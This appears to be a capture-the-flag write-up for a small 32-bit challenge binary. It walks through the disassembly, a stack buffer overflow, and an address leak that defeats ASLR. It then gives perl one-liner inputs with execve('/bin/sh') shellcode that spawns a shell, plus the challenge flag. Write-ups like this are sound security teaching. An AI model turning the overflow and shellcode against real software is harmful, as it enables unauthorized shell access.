@@ -1,0 +1,65 @@
+
+┌─────────────┬──────────────────────────[ start Writeup ]─────────────────────────────────────────┐
+| Description |
+└─────────────┘
+Disassembling the binary shows that there is only 2 symbols, _start & _exit
+_start prints to the terminal and then takes user input.
+
+08048060 <_start>:
+ 8048060:       54                      push   %esp              <-- push stack pointer
+ 8048061:       68 9d 80 04 08          push   $0x804809d        <-- push return addr _exit
+ 8048066:       31 c0                   xor    %eax,%eax
+ 8048068:       31 db                   xor    %ebx,%ebx
+ 804806a:       31 c9                   xor    %ecx,%ecx
+ 804806c:       31 d2                   xor    %edx,%edx
+ 804806e:       68 43 54 46 3a          push   $0x3a465443
+ 8048073:       68 74 68 65 20          push   $0x20656874
+ 8048078:       68 61 72 74 20          push   $0x20747261
+ 804807d:       68 73 20 73 74          push   $0x74732073
+ 8048082:       68 4c 65 74 27          push   $0x2774654c       <-- push string of len 0x14
+ 8048087:       89 e1                   mov    %esp,%ecx         <-- jump here
+ 8048089:       b2 14                   mov    $0x14,%dl
+ 804808b:       b3 01                   mov    $0x1,%bl
+ 804808d:       b0 04                   mov    $0x4,%al
+ 804808f:       cd 80                   int    $0x80             <-- write syscall
+ 8048091:       31 db                   xor    %ebx,%ebx
+ 8048093:       b2 3c                   mov    $0x3c,%dl
+ 8048095:       b0 03                   mov    $0x3,%al
+ 8048097:       cd 80                   int    $0x80             <-- read syscall
+ 8048099:       83 c4 14                add    $0x14,%esp        <-- clears stack of string
+ 804809c:       c3                      ret
+
+An input of 24 bytes will overwrite the return address of _start
+  AAAAAAAAAAAAAAAAAAAABBBB
+
+┌─────────┐
+| Exploit |
+└─────────┘
+Craft an input where shellcode is placed after the return address
+
+Exploit Mitigations: ASLR
+
+Because of ASLR, the stack is located at random location. Therefore we must leak an address. 
+Having the program return back to write syscall (0x08048087) will mean the binary will call the 
+write syscall with the following args. We can do this because the binary has no PIE the address 
+of the .text section will be fixed.
+  eax = 4    syscall number
+  ebx = 1    stdout
+  ecx = esp  buf is top of stack
+  edx = 20   bytes size
+
+This leaks 20 bytes off the top of the stack - use this to bypass ASLR
+The first 4 bytes is the saved stack pointer (first instr). It points to the 4th byte of input 
+buffer on the second read input. Shellcode will be placed at the end thus starts at 28th byte.
+  shellcode_addr = leaked_stack_ptr + 20 (ret removes 4 bytes)
+
+1. input leaks 20 bytes off stack - redirects control flow back to write system call
+  perl -e 'print "A"x20 . "\x87\x80\x04\x08"'
+
+2. input redirects control flow to shellcode 
+  shellcode_addr = leaked_stack_ptr + 20
+  perl -e 'print "A"x20 . shellcode_addr . 
+  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\x83\xc0\x0b\xcd\x80"'
+
+FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}
+
